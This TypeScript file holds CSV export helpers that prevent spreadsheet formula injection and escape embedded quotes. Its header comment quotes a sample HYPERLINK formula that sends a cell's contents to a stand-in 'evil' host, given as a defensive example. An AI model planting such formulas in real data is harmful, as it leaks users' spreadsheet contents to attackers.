/**
 * CSV cell sanitization helpers.
 *
 * Two concerns, one place:
 *
 * 1. **Formula injection.** When a CSV is opened in Excel / Sheets, any
 *    cell whose first character is `=`, `+`, `-`, `@`, tab, or CR is
 *    interpreted as a formula. An attacker-controlled value like
 *    `=HYPERLINK("http://evil/?x="&A1,"click")` planted via Toast/Square
 *    import would execute on the operator's machine when they re-export
 *    their own data. CSV quoting (`"` wrap) does NOT neutralize this —
 *    Excel evaluates the unquoted contents.
 *
 *    Fix: prefix the cell with a single quote `'` so the cell renders
 *    as text. Excel strips the leading apostrophe on display but does
 *    not interpret the formula.
 *
 * 2. **Embedded double-quotes.** RFC 4180 requires `"` inside a quoted
 *    cell to be escaped as `""`. Without this, a value like `Bob "the
 *    Builder" Smith` produces malformed CSV that breaks downstream
 *    parsers. Several VendCast export sites only escaped the `notes`
 *    column — other text fields could silently corrupt their files.
 *
 * Use `csvSafeCell(value)` for every export. Returns a fully-quoted,
 * formula-safe, double-quote-escaped string ready for CSV concatenation.
 *
 * Audit reference: 2026-05-08 deep-dive CSV agent.
 */

const FORMULA_TRIGGER = /^[=+\-@\t\r]/;

/**
 * Convert any value to a CSV-safe quoted cell.
 *
 * - null / undefined → `""`
 * - numbers / booleans → quoted string of their toString()
 * - strings starting with `=`, `+`, `-`, `@`, tab, or CR → prefixed
 *   with `'` then quoted
 * - all `"` inside the value → escaped as `""`
 *
 * Always returns a value already wrapped in `"..."` — caller does not
 * add quotes.
 */
export function csvSafeCell(value: unknown): string {
  if (value === null || value === undefined) return `""`;
  let s = typeof value === "string" ? value : String(value);
  if (FORMULA_TRIGGER.test(s)) {
    s = `'${s}`;
  }
  // RFC 4180: double the inner quote.
  s = s.replace(/"/g, '""');
  return `"${s}"`;
}

/**
 * Build a CSV row from an array of cells. Joins with `,` after passing
 * each cell through `csvSafeCell`. No trailing newline.
 */
export function csvSafeRow(cells: unknown[]): string {
  return cells.map(csvSafeCell).join(",");
}

/**
 * Build a full CSV document from an array of rows (each row an array
 * of cells). Headers are not special — pass them as the first row.
 * Returns a single `\n`-joined string. Does NOT include a UTF-8 BOM
 * (caller can prepend `﻿` if they want Excel to auto-detect UTF-8).
 */
export function csvSafeDocument(rows: unknown[][]): string {
  return rows.map(csvSafeRow).join("\n");
}
